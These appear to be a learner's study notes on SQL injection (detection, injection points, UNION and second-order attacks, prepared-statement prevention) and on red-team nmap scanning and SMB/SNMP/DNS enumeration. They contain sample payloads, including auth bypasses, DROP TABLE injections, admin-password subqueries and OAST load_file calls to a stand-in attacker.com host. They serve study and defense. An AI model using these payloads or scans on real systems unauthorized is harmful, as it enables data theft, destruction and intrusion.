# **Self-Learn : SQL Injection Basics** 

> ***Goal : PortSwigger SQLi labs + THM OWASP Top 10 (SQLi)**

## **What is SQL Injection?**

>Web Security Vulnerability that allows an attacker to interfere with the queries that an application makes to its database

## **Impact of SQL Injection?**

- Allows an attacker to view data that they are not normally able to retrieve like,
	- Passwords
	- Credit Card Information
	- Personal Information

- In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior. 

## **Detection Methods for SQL injection**

- Enter a single quote character ' and look for errors thrown in SQL Syntax.

- In Login Page Try **Auth Bypass Payloads** like "OR 1=1" and "OR 1=2", and observe the response.

- Also similarly if we have id parameter that returns set of data id=1 then if we give a SQLi payload like "1 AND 1=1"
	- If the app is vulnerable, you’ll notice:
	    - `"1 AND 1=1"` gives the same response as `"1"`.
		- `"1 AND 1=2"` gives a different response (empty result, error, or different page).
	- This change in behavior confirms that **your injected SQL is actually being executed by the database**

- Sometimes in an input field use **SQL Payloads** that are designed to trigger time delays (**Time-based SQLi**) when executed within a SQL query, and look for differences in the time taken to respond.

- **OAST (Out-of-Band Application Security Testing) payloads** designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions from the attacker server
	- **In OAST, the payloads are crafted to make the database engine reach out to the attacker’s server**.
	- ***Example : SELECT load_file('\\\\attacker.com\\share');***

## **Places of Occurrence of the Vulnerability**

- In UPDATE statements, within the updated values or the WHERE clause.

```
	- UPDATE users SET password = '<input>' WHERE username = 'admin';

	- UPDATE users SET password = 'abc' --' WHERE username = 'admin';
	- UPDATE users SET isAdmin = 1 WHERE username = 'admin' OR '1'='1';
```

- In INSERT statements, within the inserted values.

```
INSERT INTO users (username, password) VALUES ('{input}', 'test123');

INSERT INTO users (username, password) VALUES ('hacker'); DROP TABLE users; --', 'test123');
INSERT INTO logs (msg) VALUES ('test' || (SELECT load_file('\\\\attacker.com\\file')));
```


- In SELECT statements, within the table or column name.

```
String query = "SELECT " + column + " FROM products";

	SELECT name, (SELECT password FROM users WHERE role='admin') FROM products;

String query = "SELECT * FROM " + table;

	SELECT * FROM products; DROP TABLE users; --;
```

- In SELECT statements, within the ORDER BY clause. 

```
SELECT * FROM products ORDER BY {input};

	SELECT * FROM products ORDER BY 1; DROP TABLE users; --;
	SELECT * FROM products ORDER BY CASE WHEN (1=1) THEN name ELSE price END;
	ORDER BY (SELECT CASE WHEN (username='admin') THEN 1 ELSE 2 END FROM users)
```


**Examples,**

- **Retrieving hidden data**, where you can modify a SQL query to return additional results.
- **Subverting application logic**, where you can change a query to interfere with the application's logic.
- **UNION attacks**, where you can retrieve data from different database tables.
- **Blind SQL injection**, where the results of a query you control are not returned in the application's responses.


## **Examining the Database Type & Version**

 >*To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes*

    -> The type and version of the database software.
    -> The tables and columns that the database contains.

### Example Queries :

| Database Type    | Query                   |
| ---------------- | ----------------------- |
| Microsoft, MySQL | SELECT @@version        |
| Oracle           | SELECT * FROM v$version |
| PostgreSQL       | SELECT version()        |

## **SQL Injection UNION attacks**

> When a Web Application is vulnerable to SQLi and the results of the query are returned within the application response then we can use UNION keyword to retrieve data from other tables within the database

=> Union allows user to append multiple SELECT statements withing the query

```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

=> For a UNION query to work, two key requirements must be met:

    The individual queries must return the same number of columns.
    The data types in each column must be compatible between the individual queries.



## **Second Order SQL Injection**

> It is also called as Stored SQL Injection 
> 
> In this, the developers design in such a way that it initially take the data (Payload) as input and stores it in the database and no sign of SQLi is shown
> 
> But when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way.

## **Prevention Methods**

- SQL Injection can be prevented using **Parameterized Queries** instead of string concatenation 
- These Parameterized Queries is called ***Prepared Statements*** 

#### **Vulnerable Code** 

>String query = "SELECT * FROM products WHERE category = '"+ input + "'";
>Statement statement = connection.createStatement();
>ResultSet resultSet = statement.executeQuery(query);

***Builds the SQL by mixing user input and SQL code → unsafe***


#### **Modified Code**

>PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
>statement.setString(1, input);
>ResultSet resultSet = statement.executeQuery();


***Uses prepared statements (parameterized queries) so user input is always treated as data → safe***

---

# **Red Team : Scanning & Enumeration Phase**

## **Scanning**

>There are 3 types of Scanning methods available

### 1. **Network Scanning**

> Scan for Devices in the Network 
> **Tools :** Netdiscover, Nmap

### 2. **Port Scanning**

> Scan for Open, Closed & Filtered Ports
> **Tools :** Nmap, Rustscan, Unicorn, Hping
> **TryHackMe Rooms** : 
> 	**Furhternmap** (https://tryhackme.com/room/furthernmap), 
> 	**Nmap Live Host Discovery** (https://tryhackme.com/room/nmap01)

#### Port Scanning Types :

##### 1. **Full Open Scan** 

> Scans Using 3-Way Handshake
> Also Known as **TCP Connect Scan**

	nmap -sT <ip>

##### 2. **Stealth Scan**

> Only SYN, SYN-ACK Packets Traverse
> Also Known as **Half Connect Scan**
> Scans that **Bypasses Firewall** to a small extent (slightly anonymous)
> Server keeps on listening expecting for 3-Way Handshake to happen

	nmap -sS <ip>

##### 3. **Xmas Scan**

> FIN (Finish)+ URG (Urgent) + PSH (Push) Packets Traverse
> It responds with a result
> Only Some Machines Accept this type of scans

	nmap -sX <ip>

##### 4. **Maimon Scan**

> FIN (Finish)+ ACK (Acknowledge) Packets Traverse
> The result shows - No. of open ports, services, etc..,

	nmap -sM <ip>

##### 5. **Version Detection Scan** 

> Shows version of the services in addition to the result
> Ex : Pro FTPd

	nmap -sV <ip>

##### 6. **OS Detection Scan**

> Gives an approximate output of the target Operating System

	nmap -O <ip>

##### 7. **Aggression Scan**

> It combines **Version + OS** **Detection**
> It increases the speed of scan
> Chances of getting caught by the target is Very High

	nmap -A <ip>

##### 8. **UDP Scan**

> Used UDP Packets to traverse

	nmap -sU <ip>

#### **Nmap Script Engine (NSE)**

> Uses Scripts for Port Scanning instead of Flags
> Scripts Location in Kali Linux - /usr/share/nmap/scripts

	nmap --script=smb-os-discovery.nse <ip>


#### **Nmap Timings**

**T0** => Paramoid        **T3** => Normal (Default)
**T1** =>  Sneaky           **T4** => Aggression 
**T2** =>  Polite             **T5** => Insane

##### NOTE : 

**To scan all ports,**

	nmap -p- <ip>

**To scan a range of ports**

	nmap -p 20-25 <ip>


### 3. **Vulnerability Scanning**

>Scan for Vulnerabilities in Networks, Websites, etc..,
>**Tools :** Nikto (nikto -h ip), OpenVAS, Nessus, Qualys, 
>**TryHackMe Rooms :**
>	 **Nessus** (https://tryhackme.com/room/rpnessusredux)
>	 **OpenVAS** (https://tryhackme.com/room/openvas)

#### **Frameworks :**

###### 1. **MITRE ATTACK => CVE (Common Vulnerabilities & Exposures)**
###### 2. **CVSS (Common Vulnerability Scoring System)**
	1. Version 2 (V2)
		1. Low         : 0 - 3.9
		2. Medium  : 4 - 6.9
		3. High        : 7 - 10
	2. Version 3 (V3)
		1. None      : 0
		2. Low         : 0.1 - 3.9
		3. Medium  : 4.0 - 6.9
		4. High        : 7.0 - 8.9
		5. Critical     : 9.0 - 10

##### **Vulnerability Management Cycle :**

1. **Pre-Assessment**
	1. Identify Asserts & Create a Baseline
2. **Assessment**
	1. Vulnerability Scan
3. **Post-Assessment**
	1. Risk Assessment
	2. Remediation
	3. Verification
	4. Monitor

**NOTE :** 

> **Threat Intelligence** => **Proactive Monitoring** - **IoCs** - **TTP (Tactics, Techniques & Procedures**)
>  **Zero Day** - Vulnerabilities that are found but the patch is unknown 

## **Enumeration**

>Scan using Protocols

### **SMTP Enumeration** 

>**Port Number :** 25
>**Tools Used :** Metasploit { Exploit (Attack), Auxiliary (Scan) }
>**Module :** auxiliary/scanner/smtp/smtp-enum

	smtp-user-enum -U admin -t <ip>

### **SNMP Enumeration** 

>**Port Number :** 161, 162
>Manages Network Devices about MAC, IP, etc..,
>**Module :** auxiliary/scanner/snmp/snmp-enum

	snmp -check <ip>

### **SMB Enumeration** 

>**Port Number :** 445
>Manages Communication
>**Tools :** smbclient, enum4linux, nbtscan, nmblookup, smbmap
>**NOTE** : enum4linux also used in NETBIOS (Port : 139) - Network Basics Input Output System

	smbclient -L <ip>
	nmblookup -A <ip>
	nbtscan <ip>
	smbmap -H <ip>

### **DNS Enumeration** 

>**Port Number :** 53
>DNS Stands for Domain Name System/Server
>**Tools :** nslookup, dig, 

	nslookup www.google.com
	dig www.google.com AAAA (For ipv6)
	dig www.google.com ns (Server info)
	dig www.google.com mx (Mail Server)

#### **Other Terminologies & Tools:** 

1. **SPF (Sender Policy Framework)**
	 lists all the IP addresses of servers authorized to send emails on behalf of that domain
	 Tool Used : whoislookup

2. **DMARC (Domain-Based Message Authentication, Reporting & Conformance)**
	tells receiving mail servers what to do with emails that fail SPF or DKIM checks
	Tool Used : whoislookup

3. **Ping**
	Checks connection the server whether it is reachable or not
	ICMP (Internet Control Message Protocol)
	ping ip

4. **Trace Route**
	maps the path network packets take from your computer to a destination,
	traceroute google.com (Linux)
	tracert google.com (Windows)


